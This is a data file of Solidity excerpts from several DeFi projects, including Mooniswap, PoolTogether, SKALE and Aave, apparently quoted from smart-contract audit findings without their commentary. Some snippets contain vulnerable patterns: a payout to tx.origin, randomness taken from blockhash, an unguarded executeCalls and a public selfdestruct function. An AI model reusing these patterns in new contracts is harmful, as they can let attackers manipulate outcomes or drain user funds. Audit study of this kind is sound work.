"```\nif (path[0].isETH()) {\n    tx.origin.transfer(availableBalance);\n} else {\n    path[0].safeTransfer(address(mooniswap), availableBalance);\n}\n```\n```\nIERC20[] memory tokens = mooniswap.getTokens();\nuint256 token0Balance = tokens[0].balanceOf(address(this));\nuint256 token1Balance = tokens[1].balanceOf(address(this));\n```\n```\nfunction unwrapLPTokens(Mooniswap mooniswap) external\n    validSpread(mooniswap)\n{\n    mooniswap.withdraw(mooniswap.balanceOf(address(this)), new uint256[](0));\n}\n\nfunction swap(IERC20[] memory path) external\n    validPath(path)\n{\n    (uint256 amount,) = _maxAmountForSwap(path, path[0].uniBalanceOf(address(this)));\n    uint256 result = _swap(path, amount, payable(address(rewards)));\n    rewards.notifyRewardAmount(result);\n}\n```\n```\nfunction updateReward(address referral, uint256 amount) external override {\n    Mooniswap mooniswap = Mooniswap(msg.sender);\n    TokenInfo storage token = tokenInfo[mooniswap];\n    UserInfo storage user = userInfo[referral];\n    uint256 currentEpoch = token.currentEpoch;\n\n    // Add new reward to current epoch\n    user.share[mooniswap][currentEpoch] = user.share[mooniswap][currentEpoch].add(amount);\n    token.epochBalance[currentEpoch].totalSupply = token.epochBalance[currentEpoch].totalSupply.add(amount);\n\n    _collectProcessedEpochs(user, token, mooniswap, currentEpoch);\n}\n```\n```\nfunction freezeEpoch(Mooniswap mooniswap) external validSpread(mooniswap) {\n    TokenInfo storage token = tokenInfo[mooniswap];\n\n    uint256 currentEpoch = token.currentEpoch;\n    require(token.firstUnprocessedEpoch == currentEpoch, ""Previous epoch is not finalized"");\n\n    IERC20[] memory tokens = mooniswap.getTokens();\n\n    uint256 token0Balance = tokens[0].balanceOf(address(this));\n    uint256 token1Balance = tokens[1].balanceOf(address(this));\n\n    mooniswap.withdraw(mooniswap.balanceOf(address(this)), new uint256[](0));\n\n    token.epochBalance[currentEpoch].token0Balance = tokens[0].balanceOf(address(this)).sub(token0Balance);\n    token.epochBalance[currentEpoch].token1Balance = tokens[1].balanceOf(address(this)).sub(token1Balance);\n\n    token.currentEpoch = currentEpoch.add(1);\n}\n```\n```\nif (share > 0) {\n    EpochBalance storage epochBalance = token.epochBalance[firstUnprocessedEpoch];\n    uint256 totalSupply = epochBalance.totalSupply;\n\n    user.share[mooniswap][firstUnprocessedEpoch] = 0;\n    epochBalance.totalSupply = totalSupply.sub(share);\n\n    IERC20[] memory tokens = mooniswap.getTokens();\n\n    epochBalance.token0Balance = _transferTokenShare(tokens[0], epochBalance.token0Balance, share, totalSupply);\n    epochBalance.token1Balance = _transferTokenShare(tokens[1], epochBalance.token1Balance, share, totalSupply);\n    epochBalance.inchBalance = _transferTokenShare(inchToken, epochBalance.inchBalance, share, totalSupply);\n}\n```"
"```\nfunction notifyFor(address account) external {\n    _notifyFor(account, balanceOf(msg.sender));\n}\n```\n```\nfunction _notifyFor(address account, uint256 balance) private {\n    uint256 modulesLength = _modules.length();\n    for (uint256 i = 0; i < modulesLength; i++) {\n        IGovernanceModule(_modules.at(i)).notifyStakeChanged(account, balance);\n    }\n}\n```\nfunction notifyStakeChanged(address account, uint256 newBalance) external override onlyMothership {\n    _notifyStakeChanged(account, newBalance);\n}\n```\n```\nfunction _notifyStakeChanged(address account, uint256 newBalance) internal override {\n    uint256 balance = balanceOf(account);\n    if (newBalance > balance) {\n        _mint(account, newBalance.sub(balance));\n    } else if (newBalance < balance) {\n        _burn(account, balance.sub(newBalance));\n    } else {\n        return;\n    }\n\n    uint256 newTotalSupply = totalSupply();\n\n    _defaultFee.updateBalance(account, _defaultFee.votes[account], balance, newBalance, newTotalSupply, _DEFAULT_FEE, _emitDefaultFeeVoteUpdate);\n    _defaultSlippageFee.updateBalance(account, _defaultSlippageFee.votes[account], balance, newBalance, newTotalSupply, _DEFAULT_SLIPPAGE_FEE, _emitDefaultSlippageFeeVoteUpdate);\n    _defaultDecayPeriod.updateBalance(account, _defaultDecayPeriod.votes[account], balance, newBalance, newTotalSupply, _DEFAULT_DECAY_PERIOD, _emitDefaultDecayPeriodVoteUpdate);\n    _referralShare.updateBalance(account, _referralShare.votes[account], balance, newBalance, newTotalSupply, _DEFAULT_REFERRAL_SHARE, _emitReferralShareVoteUpdate);\n    _governanceShare.updateBalance(account, _governanceShare.votes[account], balance, newBalance, newTotalSupply, _DEFAULT_GOVERNANCE_SHARE, _emitGovernanceShareVoteUpdate);\n}\n```\nfunction _notifyStakeChanged(address account, uint256 newBalance) internal override updateReward(account) {\n    uint256 balance = balanceOf(account);\n    if (newBalance > balance) {\n        _mint(account, newBalance.sub(balance));\n    } else if (newBalance < balance) {\n        _burn(account, balance.sub(newBalance));\n    }\n}\n```"
"```\nfunction uniTransferFrom(IERC20 token, address payable from, address to, uint256 amount) internal {\n    if (amount > 0) {\n        if (isETH(token)) {\n            require(msg.value >= amount, ""UniERC20: not enough value"");\n            if (msg.value > amount) {\n                from.transfer(msg.value.sub(amount));\n            }\n        } else {\n            token.safeTransferFrom(from, to, amount);\n        }\n    }\n}"
"```\nfunction _beforeTokenTransfer(address from, address to, uint256 amount) internal override {\n    uint256 balanceFrom = (from!= address(0))? balanceOf(from) : 0;\n    uint256 balanceTo = (from!= address(0))? balanceOf(to) : 0;\n    uint256 newTotalSupply = totalSupply()\n       .add(from == address(0)? amount : 0)\n       .sub(to == address(0)? amount : 0);\n\n    ParamsHelper memory params = ParamsHelper({\n        from: from,\n        to: to,\n        amount: amount,\n        balanceFrom: balanceFrom,\n        balanceTo: balanceTo,\n        newTotalSupply: newTotalSupply\n    });\n}\n```\nif (params.to!= address(0)) {\n    votingData.updateBalance(\n        params.to,\n        voteTo,\n        params.balanceTo,\n        params.balanceTo.add(params.amount),\n        params.newTotalSupply,\n        defaultValue,\n        emitEvent\n    );\n}\n```"
"```\nfunction _beforeTokenTransfer(address from, address to, uint256 amount) internal override {\n    uint256 balanceFrom = (from!= address(0))? balanceOf(from) : 0;\n    uint256 balanceTo = (from!= address(0))? balanceOf(to) : 0;\n    uint256 newTotalSupply = totalSupply()\n       .add(from == address(0)? amount : 0)\n       .sub(to == address(0)? amount : 0);\n\n    ParamsHelper memory params = ParamsHelper({\n        from: from,\n        to: to,\n        amount: amount,\n        balanceFrom: balanceFrom,\n        balanceTo: balanceTo,\n        newTotalSupply: newTotalSupply\n    });\n\n    _updateOnTransfer(params, mooniswapFactoryGovernance.defaultFee, _emitFeeVoteUpdate, _fee);\n    _updateOnTransfer(params, mooniswapFactoryGovernance.defaultSlippageFee, _emitSlippageFeeVoteUpdate, _slippageFee);\n    _updateOnTransfer(params, mooniswapFactoryGovernance.defaultDecayPeriod, _emitDecayPeriodVoteUpdate, _decayPeriod);\n}\n```\n```\nif (params.from!= address(0)) {\n    votingData.updateBalance(\n        params.from,\n        voteFrom,\n        params.balanceFrom,\n        params.balanceFrom.sub(params.amount),\n        params.newTotalSupply,\n        defaultValue,\n        emitEvent\n    );\n}\n\nif (params.to!= address(0)) {\n    votingData.updateBalance(\n        params.to,\n        voteTo,\n        params.balanceTo,\n        params.balanceTo.add(params.amount),\n        params.newTotalSupply,\n        defaultValue,\n        emitEvent\n    );\n}\n```"
"```\nfunction setReferralFeeReceiver(address newReferralFeeReceiver) external onlyOwner {\n    referralFeeReceiver = newReferralFeeReceiver;\n    emit ReferralFeeReceiverUpdate(newReferralFeeReceiver);\n}\n```\n```\nif (referral!= address(0)) {\n    referralShare = invIncrease.mul(referralShare).div(_FEE_DENOMINATOR);\n    if (referralShare > 0) {\n        if (referralFeeReceiver!= address(0)) {\n            _mint(referralFeeReceiver, referralShare);\n            IReferralFeeReceiver(referralFeeReceiver).updateReward(referral, referralShare)\n```\n```\nfunction addModule(address module) external onlyOwner {\n    require(_modules.add(module), ""Module already registered"");\n    emit AddModule(module);\n}\n```\n```\nfunction _notifyFor(address account, uint256 balance) private {\n    uint256 modulesLength = _modules.length();\n    for (uint256 i = 0; i < modulesLength; i++) {\n        IGovernanceModule(_modules.at(i)).notifyStakeChanged(account, balance);\n    }\n}\n```\nfunction removeModule(address module) external onlyOwner {\n    require(_modules.remove(module), ""Module was not registered"");\n    emit RemoveModule(module);\n}\n```"
"```\nfunction rescueFunds(IERC20 token, uint256 amount) external nonReentrant onlyOwner {\n    uint256 balance0 = token0.uniBalanceOf(address(this));\n    uint256 balance1 = token1.uniBalanceOf(address(this));\n\n    token.uniTransfer(msg.sender, amount);\n\n    require(token0.uniBalanceOf(address(this)) >= balance0, ""Mooniswap: access denied"");\n    require(token1.uniBalanceOf(address(this)) >= balance1, ""Mooniswap: access denied"");\n    require(balanceOf(address(this)) >= _BASE_SUPPLY, ""Mooniswap: access denied"");\n}\n```"
"```\nmodifier refundsAttachedEth() {\n    _;\n    uint256 remainingBalance = LibSafeMathV06.min256(msg.value, address(this).balance);\n    if (remainingBalance > 0) {\n        msg.sender.transfer(remainingBalance);\n    }\n}\n```\n```\nif (inputToken == ETH_TOKEN_ADDRESS) {\n    provider.transfer(sellAmount);\n}\n```"
"```\nmstore(0xB00, ALLOWANCE_CALL_SELECTOR_32)\nmstore(0xB04, caller())\nmstore(0xB24, address())\nlet success := call(gas(), token, 0, 0xB00, 0x44, 0xC00, 0x20)\n```"
"```\nmstore(0xB00, UNISWAP_PAIR_RESERVES_CALL_SELECTOR_32)\nif iszero(staticcall(gas(), pair, 0xB00, 0x4, 0xC00, 0x40)) {\n    bubbleRevert()\n}\n```\n```\nmstore(0xB00, ALLOWANCE_CALL_SELECTOR_32)\nmstore(0xB04, caller())\nmstore(0xB24, address())\nlet success := call(gas(), token, 0, 0xB00, 0x44, 0xC00, 0x20)\n```"
"```\nfunction beforeTokenTransfer(\n    address from,\n    address to,\n    uint256 amount,\n    address controlledToken\n) external override onlyPrizePool {\n    if (controlledToken == address(ticket)) {\n        _requireNotLocked();\n    }\n}\n```\n```\nfunction _requireNotLocked() internal view {\n    uint256 currentBlock = _currentBlock();\n    require(rngRequest.lockBlock == 0 || currentBlock < rngRequest.lockBlock, ""PeriodicPrizeStrategy/rng-in-flight"");\n}\n```\n```\nfunction setRngService(RNGInterface rngService) external onlyOwner {\n    require(!isRngRequested(), ""PeriodicPrizeStrategy/rng-in-flight"");\n}"
"```\nconstructor() public {\n    lootBoxActionInstance = new LootBox();\n    lootBoxActionBytecode = MinimalProxyLibrary.minimalProxy(address(lootBoxActionInstance));\n}\n```\n```\nfunction destroy(address payable to) external {\n    selfdestruct(to);\n}\n```\n```\ncontract CounterfactualAction {\n    function depositTo(address payable user, PrizePool prizePool, address output, address referrer) external {\n        IERC20 token = IERC20(prizePool.token());\n        uint256 amount = token.balanceOf(address(this));\n        token.approve(address(prizePool), amount);\n        prizePool.depositTo(user, amount, output, referrer);\n        selfdestruct(user);\n    }\n\n    function cancel(address payable user, PrizePool prizePool) external {\n        IERC20 token = IERC20(prizePool.token());\n        token.transfer(user, token.balanceOf(address(this)));\n        selfdestruct(user);\n    }\n}"
"```\nmodifier onlyPrizePool() {\n    require(_msgSender() == address(prizePool), ""PeriodicPrizeStrategy/only-prize-pool"");\n}\n```\n```\nmodifier onlyOwnerOrListener() {\n    require(_msgSender() == owner() || _msgSender() == address(periodicPrizeStrategyListener), ""PeriodicPrizeStrategy/only-owner-or-listener"");\n}\n```\n```\nemit PrizePoolOpened(_msgSender(), prizePeriodStartedAt);\n```\n```\nemit PrizePoolAwardStarted(\n    _msgSender(),\n    address(prizePool),\n    requestId,\n    lockBlock\n);\n```\nemit PrizePoolAwarded(_msgSender(), randomNumber);\nemit PrizePoolOpened(_msgSender(), prizePeriodStartedAt);\n```\n```\nfunction _msgSender()\n  internal\n  override(BaseRelayRecipient, ContextUpgradeSafe)\n  virtual\n  view\n  returns (address payable)\n{\n  return BaseRelayRecipient._msgSender();\n}\n```"
"```\nfunction setNumberOfWinners(uint256 count) external onlyOwner {\n    _numberOfWinners = count;\n\n    emit NumberOfWinnersSet(count);\n}\n```\nfunction setRngService(RNGInterface rngService) external onlyOwner {\n    require(!isRngRequested(), ""PeriodicPrizeStrategy/rng-in-flight"");\n\n    rng = rngService;\n    emit RngServiceUpdated(address(rngService));\n}\n```\n```\nfunction setRngRequestTimeout(uint32 _rngRequestTimeout) external onlyOwner {\n    _setRngRequestTimeout(_rngRequestTimeout);\n}\n```\n```\nfunction setTokenListener(TokenListenerInterface _tokenListener) external onlyOwner {\n    tokenListener = _tokenListener;\n\n    emit TokenListenerUpdated(address(tokenListener));\n}\n```\n```\nfunction setPeriodicPrizeStrategyListener(address _periodicPrizeStrategyListener) external onlyOwner {\n    periodicPrizeStrategyListener = PeriodicPrizeStrategyListener(_periodicPrizeStrategyListener);\n\n    emit PeriodicPrizeStrategyListenerSet(_periodicPrizeStrategyListener);\n}\n```\n```\nfunction setPrizeStrategy(address _prizeStrategy) external override onlyOwner {\n    _setPrizeStrategy(TokenListenerInterface(_prizeStrategy));\n}\n```\n```\nfunction removeExternalErc20Award(address _externalErc20, address _prevExternalErc20) external onlyOwner {\n    externalErc20s.removeAddress(_prevExternalErc20, _externalErc20);\n    emit ExternalErc20AwardRemoved(_externalErc20);\n}\n```\n```\nfunction removeExternalErc721Award(address _externalErc721, address _prevExternalErc721) external onlyOwner {\n    externalErc721s.removeAddress(_prevExternalErc721, _externalErc721);\n    delete externalErc721TokenIds[_externalErc721];\n    emit ExternalErc721AwardRemoved(_externalErc721);\n}\n```\n```\nfunction transferExternalERC20(\n  address to,\n  address externalToken,\n  uint256 amount\n)\n  external\n  onlyOwner\n{\n  prizePool.transferExternalERC20(to, externalToken, amount);\n}\n```"
"```\nfunction addExternalErc721Award(address _externalErc721, uint256[] calldata _tokenIds) external onlyOwnerOrListener {\n    require(prizePool.canAwardExternal(_externalErc721), ""PeriodicPrizeStrategy/cannot-award-external"");\n\n    if (!externalErc721s.contains(_externalErc721)) {\n        externalErc721s.addAddress(_externalErc721);\n    }\n\n    for (uint256 i = 0; i < _tokenIds.length; i++) {\n        uint256 tokenId = _tokenIds[i];\n        require(IERC721(_externalErc721).ownerOf(tokenId) == address(prizePool), ""PeriodicPrizeStrategy/unavailable-token"");\n        externalErc721TokenIds[_externalErc721].push(tokenId);\n    }\n\n    emit ExternalErc721AwardAdded(_externalErc721, _tokenIds);\n}\n```\n```\nfunction _awardExternalErc721s(address winner) internal {\n    address currentToken = externalErc721s.start();\n    while (currentToken!= address(0) && currentToken!= externalErc721s.end()) {\n        uint256 balance = IERC721(currentToken).balanceOf(address(prizePool));\n        if (balance > 0) {\n            prizePool.awardExternalERC721(winner, currentToken, externalErc721TokenIds[currentToken]);\n            delete externalErc721TokenIds[currentToken];\n        }\n        currentToken = externalErc721s.next(currentToken);\n    }\n    externalErc721s.clearAll();\n}\n```\n```\nfunction awardExternalERC721(\n  address to,\n  address externalToken,\n  uint256[] calldata tokenIds\n)\n  external override\n  onlyPrizeStrategy\n{\n  require(_canAwardExternal(externalToken), ""PrizePool/invalid-external-token"");\n\n  if (tokenIds.length == 0) {\n    return;\n  }\n\n  for (uint256 i = 0; i < tokenIds.length; i++) {\n    IERC721(externalToken).transferFrom(address(this), to, tokenIds[i]);\n  }\n\n  emit AwardedExternalERC721(to, externalToken, tokenIds);\n}\n```"
"```\nfunction _awardExternalErc721s(address winner) internal {\n    address currentToken = externalErc721s.start();\n    while (currentToken!= address(0) && currentToken!= externalErc721s.end()) {\n        uint256 balance = IERC721(currentToken).balanceOf(address(prizePool));\n        if (balance > 0) {\n            prizePool.awardExternalERC721(winner, currentToken, externalErc721TokenIds[currentToken]);\n            delete externalErc721TokenIds[currentToken];\n        }\n        currentToken = externalErc721s.next(currentToken);\n    }\n    externalErc721s.clearAll();\n}\n```"
"```\nfunction addExternalErc20Award(address _externalErc20) external onlyOwnerOrListener {\n    _addExternalErc20Award(_externalErc20);\n}\n\nfunction _addExternalErc20Award(address _externalErc20) internal {\n    require(prizePool.canAwardExternal(_externalErc20), ""PeriodicPrizeStrategy/cannot-award-external"");\n    externalErc20s.addAddress(_externalErc20);\n    emit ExternalErc20AwardAdded(_externalErc20);\n}\n```\n```\nfunction addAddress(Mapping storage self, address newAddress) internal {\n    require(newAddress!= SENTINEL && newAddress!= address(0), ""Invalid address"");\n    require(self.addressMap[newAddress] == address(0), ""Already added"");\n    self.addressMap[newAddress] = self.addressMap[SENTINEL];\n    self.addressMap[SENTINEL] = newAddress;\n    self.count = self.count + 1;\n}\n```\n```\nfunction _awardExternalErc721s(address winner) internal {\n    address currentToken = externalErc721s.start();\n    while (currentToken!= address(0) && currentToken!= externalErc721s.end()) {\n        uint256 balance = IERC721(currentToken).balanceOf(address(prizePool));\n        if (balance > 0) {\n            prizePool.awardExternalERC721(winner, currentToken, externalErc721TokenIds[currentToken]);\n            delete externalErc721TokenIds[currentToken];\n        }\n        currentToken = externalErc721s.next(currentToken);\n    }\n    externalErc721s.clearAll();\n}\n```"
"```\nrequire(_numberOfWinners > 0, ""MultipleWinners/num-gt-zero"")\n```\n```\nfunction setNumberOfWinners(uint256 count) external onlyOwner {\n    _numberOfWinners = count;\n\n    emit NumberOfWinnersSet(count);\n}"
"```\nfunction plunder(\n  address erc721,\n  uint256 tokenId,\n  IERC20[] calldata erc20s,\n  LootBox.WithdrawERC721[] calldata erc721s,\n  LootBox.WithdrawERC1155[] calldata erc1155s\n) external {\n  address payable owner = payable(IERC721(erc721).ownerOf(tokenId));\n}\n```\n```\n/**\n * @dev See {IERC721-ownerOf}.\n */\nfunction ownerOf(uint256 tokenId) public view override returns (address) {\n    return _tokenOwners[tokenId];\n}\n```\n```\nfunction plunder(\n  IERC20[] memory erc20,\n  WithdrawERC721[] memory erc721,\n  WithdrawERC1155[] memory erc1155,\n  address payable to\n) external {\n    _withdrawERC20(erc20, to);\n    _withdrawERC721(erc721, to);\n    _withdrawERC1155(erc1155, to);\n    transferEther(to, address(this).balance);\n}\n```"
"```\nfunction canStartAward() external view returns (bool) {\n    return _isPrizePeriodOver() &&!isRngRequested();\n}\n```\n```\nmodifier requireCanStartAward() {\n    require(_isPrizePeriodOver(), ""PeriodicPrizeStrategy/prize-period-not-over"");\n    require(!isRngRequested() || isRngTimedOut(), ""PeriodicPrizeStrategy/rng-already-requested"");\n}\n```\n```\nfunction canCompleteAward() external view returns (bool) {\n    return isRngRequested() && isRngCompleted();\n}\n```\n```\nmodifier requireCanCompleteAward() {\n    require(_isPrizePeriodOver(), ""PeriodicPrizeStrategy/prize-period-not-over"");\n    require(isRngRequested(), ""PeriodicPrizeStrategy/rng-not-requested"");\n    require(isRngCompleted(), ""PeriodicPrizeStrategy/rng-not-complete"");\n}\n```"
```\nuint256 ticketSplit = totalSupply.div(__numberOfWinners);\nuint256 nextRandom = randomNumber.add(ticketSplit);\n\nfor (uint256 winnerCount = 1; winnerCount < __numberOfWinners; winnerCount++) {\n    winners[winnerCount] = ticket.draw(nextRandom);\n    nextRandom = nextRandom.add(ticketSplit);\n}\n```
"```\ncontract SingleRandomWinner is PeriodicPrizeStrategy {\n    function _distribute(uint256 randomNumber) internal override {\n        uint256 prize = prizePool.captureAwardBalance();\n        address winner = ticket.draw(randomNumber);\n        if (winner!= address(0)) {\n            _awardTickets(winner, prize);\n            _awardAllExternalTokens(winner);\n        }\n    }\n}\n```\n```\nfunction _distribute(uint256 randomNumber) internal override {\n    uint256 prize = prizePool.captureAwardBalance();\n\n    // main winner gets all external tokens\n    address mainWinner = ticket.draw(randomNumber);\n    _awardAllExternalTokens(mainWinner);\n\n    address[] memory winners = new address[](_numberOfWinners);\n    winners[0] = mainWinner;\n```"
```\nconstructor () public {\n    instance = new MultipleWinners();\n}\n```\n```\nconstructor() public {\n    erc721ControlledInstance = new ERC721Controlled();\n    erc721ControlledBytecode = MinimalProxyLibrary.minimalProxy(address(erc721ControlledInstance));\n}\n```\n```\nconstructor() public {\n    lootBoxActionInstance = new LootBox();\n    lootBoxActionBytecode = MinimalProxyLibrary.minimalProxy(address(lootBoxActionInstance));\n}\n```
"```\nfunction transferEther(address payable to, uint256 amount) public {\n    to.transfer(amount);\n\n    emit TransferredEther(to, amount);\n}"
"```\nfunction executeCalls(Call[] calldata calls) external returns (bytes[] memory) {\n    bytes[] memory response = new bytes[](calls.length);\n    for (uint256 i = 0; i < calls.length; i++) {\n        response[i] = _executeCall(calls[i].to, calls[i].value, calls[i].data);\n    }\n    return response;\n}\n```"
"```\nif (!instance.transfer(getSendAddress(), forwarderBalance)) {\n    revert('Could not gather ERC20');\n}\n```"
"```\naddress sender = _hashPrimaryTypedData(\n    _hashTypedData(\n        nonce,\n        to,\n        data\n    )\n).recoverAddress(senderSignature);\n```"
"```\naccounts[account].owners[owner].removedAtBlockNumber = block.number\n\nemit AccountOwnerRemoved(\n    account,\n    owner\n)\n```\nfunction _verifySender(\n    address account\n) private\nreturns (address) {\n    address sender = _getContextSender();\n\n    if (!accounts[account].owners[sender].added) {\n        require(accounts[account].salt == 0);\n        bytes32 salt = keccak256(abi.encodePacked(sender));\n        require(account == _computeAccountAddress(salt));\n        accounts[account].salt = salt;\n        accounts[account].owners[sender].added = true;\n        emit AccountOwnerAdded(account, sender);\n    }\n\n    return sender;\n}\n```"
"```\nfunction withdrawDeposit(\n    address token\n) external {\n    address owner = _getContextAccount();\n    uint256 lockedUntil = deposits[owner].withdrawalLockedUntil[token];\n\n    if (lockedUntil!= 0 && lockedUntil <= now) {\n        deposits[owner].withdrawalLockedUntil[token] = 0;\n\n        address depositAccount = deposits[owner].account;\n        uint256 depositValue;\n\n        if (token == address(0)) {\n            depositValue = depositAccount.balance;\n        } else {\n            depositValue = ERC20Token(token).balanceOf(depositAccount);\n        }\n\n        _transferFromDeposit(\n            depositAccount,\n            owner,\n            token,\n            depositValue\n        );\n\n        emit DepositWithdrawn(\n            depositAccount,\n            owner,\n            token,\n            depositValue\n        );\n    } else {\n        _deployDepositAccount(owner);\n\n        lockedUntil = now.add(depositWithdrawalLockPeriod);\n\n        deposits[owner].withdrawalLockedUntil[token] = lockedUntil;\n\n        emit DepositWithdrawalRequested(\n            deposits[owner].account,\n            owner,\n            token,\n            lockedUntil\n        );\n    }\n}\n```\nif (deposits[sender].withdrawalLockedUntil[token] > 0) {\n    deposits[sender].withdrawalLockedUntil[token] = 0;\n}"
"```\nif (lockedUntil!= 0 && lockedUntil <= now) {\n    deposits[owner].withdrawalLockedUntil[token] = 0;\n\n    address depositAccount = deposits[owner].account;\n    uint256 depositValue;\n\n    if (token == address(0)) {\n        depositValue = depositAccount.balance;\n    } else {\n        depositValue = ERC20Token(token).balanceOf(depositAccount);\n    }\n\n    _transferFromDeposit(\n        depositAccount,\n        owner,\n        token,\n        depositValue\n    );\n\n    emit DepositWithdrawn(\n        depositAccount,\n        owner,\n        token,\n        depositValue\n    );\n} else {\n    _deployDepositAccount(owner);\n\n    lockedUntil = now.add(depositWithdrawalLockPeriod);\n}\n```"
"```\nfor (uint256 i = 0; i < data.length; i++) {\n    require(to[i]!= address(0));\n    (succeeded,) = to[i].call(abi.encodePacked(data[i], account, sender));\n    require(succeeded);\n}\n```"
"```\nfunction _deployAccount(\n    bytes32 salt,\n    uint256 value\n)\ninternal\nreturns (address) {\n    return address(new Account{salt: salt, value: value}());\n}\n```"
"```\nreturn (\n    epochPoolSize\n   .add(_bountyWasPaidInCurrentEpoch)\n   .mul(\n        delegationController.getAndUpdateEffectiveDelegatedToValidator(\n            nodes.getValidatorId(nodeIndex),\n            currentMonth\n        )\n    )\n   .div(effectiveDelegatedSum)\n)"
"```\nfunction freezeSchains(uint nodeIndex) external only(""SkaleManager"") {\n    SchainsInternal schainsInternal = SchainsInternal(contractManager.getContract(""SchainsInternal""));\n    bytes32[] memory schains = schainsInternal.getActiveSchains(nodeIndex);\n\n    for (uint i = 0; i < schains.length; i++) {\n        Rotation memory rotation = rotations[schains[i]];\n        if (rotation.nodeIndex == nodeIndex && now < rotation.freezeUntil) {\n            continue;\n        }\n\n        string memory schainName = schainsInternal.getSchainName(schains[i]);\n        string memory revertMessage = ""Node cannot rotate on Schain "";\n        revertMessage = string(abi.encodePacked(revertMessage, schainName));\n        revertMessage = string(abi.encodePacked(revertMessage, "", occupied by Node ""));\n        revertMessage = string(abi.encodePacked(revertMessage, rotation.nodeIndex.toString()));\n\n        string memory dkgRevert = ""DKG process did not finish on schain "";\n        ISkaleDKG skaleDKG = ISkaleDKG(contractManager.getContract(""SkaleDKG""));\n        require(\n            skaleDKG.isLastDKGSuccessful(keccak256(abi.encodePacked(schainName))),\n            string(abi.encodePacked(dkgRevert, schainName))\n        );\n        require(rotation.freezeUntil < now, revertMessage);\n        _startRotation(schains[i], nodeIndex);\n    }\n}"
"```\nfunction _startRotation(bytes32 schainIndex, uint nodeIndex) private {\n    ConstantsHolder constants = ConstantsHolder(contractManager.getContract(""ConstantsHolder""));\n    rotations[schainIndex].nodeIndex = nodeIndex;\n    rotations[schainIndex].newNodeIndex = nodeIndex;\n    rotations[schainIndex].freezeUntil = now.add(constants.rotationDelay());\n    waitForNewNode[schainIndex] = true;\n}\n```"
"```\nfunction _generateGroup(bytes32 schainId, uint numberOfNodes) private returns (uint[] memory nodesInGroup) {\n    Nodes nodes = Nodes(contractManager.getContract(""Nodes""));\n    uint8 space = schains[schainId].partOfNode;\n    nodesInGroup = new uint[](numberOfNodes);\n\n    uint[] memory possibleNodes = isEnoughNodes(schainId);\n    require(possibleNodes.length >= nodesInGroup.length, ""Not enough nodes to create Schain"");\n\n    uint ignoringTail = 0;\n    uint random = uint(keccak256(abi.encodePacked(uint(blockhash(block.number.sub(1))), schainId)));\n\n    for (uint i = 0; i < nodesInGroup.length; ++i) {\n        uint index = random % (possibleNodes.length.sub(ignoringTail));\n        uint node = possibleNodes[index];\n        nodesInGroup[i] = node;\n        _swap(possibleNodes, index, possibleNodes.length.sub(ignoringTail).sub(1));\n        ++ignoringTail;\n\n        _exceptionsForGroups[schainId][node] = true;\n        addSchainForNode(node, schainId);\n        require(nodes.removeSpaceFromNode(node, space), ""Could not remove space from Node"");\n    }\n}"
"```\nfunction deposit(\n    address asset,\n    uint256 amount,\n    address onBehalfOf,\n    uint16 referralCode\n) external override {\n    _whenNotPaused();\n    ReserveLogic.ReserveData storage reserve = _reserves[asset];\n\n    ValidationLogic.validateDeposit(reserve, amount);\n\n    address aToken = reserve.aTokenAddress;\n\n    reserve.updateState();\n    reserve.updateInterestRates(asset, aToken, amount, 0);\n\n    bool isFirstDeposit = IAToken(aToken).balanceOf(onBehalfOf) == 0;\n    if (isFirstDeposit) {\n        _usersConfig[onBehalfOf].setUsingAsCollateral(reserve.id, true);\n    }\n\n    IAToken(aToken).mint(onBehalfOf, amount, reserve.liquidityIndex);\n\n    // transfer to the aToken contract\n    IERC20(asset).safeTransferFrom(msg.sender, aToken, amount);\n\n    emit Deposit(asset, msg.sender, onBehalfOf, amount, referralCode);\n}\n```"
"```\nvars.fromReserveAToken.burn(\n    msg.sender,\n    receiverAddress,\n    amountToSwap,\n    fromReserve.liquidityIndex\n);\n\nISwapAdapter(receiverAddress).executeOperation(\n    fromAsset,\n    toAsset,\n    amountToSwap,\n    address(this),\n    params\n);\n\nvars.amountToReceive = IERC20(toAsset).balanceOf(receiverAddress);\nif (vars.amountToReceive!= 0) {\n    IERC20(toAsset).transferFrom(\n        receiverAddress,\n        address(vars.toReserveAToken),\n        vars.amountToReceive\n    );\n\n    if (vars.toReserveAToken.balanceOf(msg.sender) == 0) {\n        _usersConfig[msg.sender].setUsingAsCollateral(toReserve.id, true);\n    }\n\n    vars.toReserveAToken.mint(msg.sender, vars.amountToReceive, toReserve.liquidityIndex);\n}\n```"
"```\ntry_to_move_to_validating(_proposal_id)\n```\n```\nfunction tryToMoveToValidating(uint256 _proposalId) public {\n    Proposal storage _proposal = proposals[_proposalId];\n    require(_proposal.proposalStatus == ProposalStatus.Voting, ""VOTING_STATUS_REQUIRED"");\n    if (_proposal.currentStatusInitBlock.add(_proposal.votingBlocksDuration) <= block.number) {\n        for (uint256 i = 0; i <= COUNT_CHOICES; i++) {\n            if (_proposal.votes[i] > _proposal.precReq) {\n                internalMoveToValidating(_proposalId);\n            }\n        }\n    }\n}\n```\n```\nfunction internalMoveToValidating(uint256 _proposalId) internal {\n    Proposal storage _proposal = proposals[_proposalId];\n    require(_proposal.proposalStatus == ProposalStatus.Voting, ""ONLY_ON_VOTING_STATUS"");\n    _proposal.proposalStatus = ProposalStatus.Validating;\n    _proposal.currentStatusInitBlock = block.number;\n    emit StatusChangeToValidating(_proposalId);\n}\n```\n```\nfor (uint256 i = 0; i <= COUNT_CHOICES; i++) {\n    if (_proposal.votes[i] > _proposal.precReq) {\n        internalMoveToValidating(_proposalId);\n    }\n}\n```\n```\nrequire(\n    _proposal.proposalStatus == ProposalStatus.Voting,\n    ""ONLY_ON_VOTING_STATUS""\n)\n_proposal.proposalStatus = ProposalStatus.Validating"
"```\nfunction verifyNonce(uint256 _proposalId, address _voter, uint256 _relayerNonce) public view {\n    Proposal storage _proposal = proposals[_proposalId];\n    require(_proposal.voters[_voter].nonce < _relayerNonce, ""INVALID_NONCE"");\n}\n```\n```\nvoter.nonce = voter.nonce.add(1)\n```"
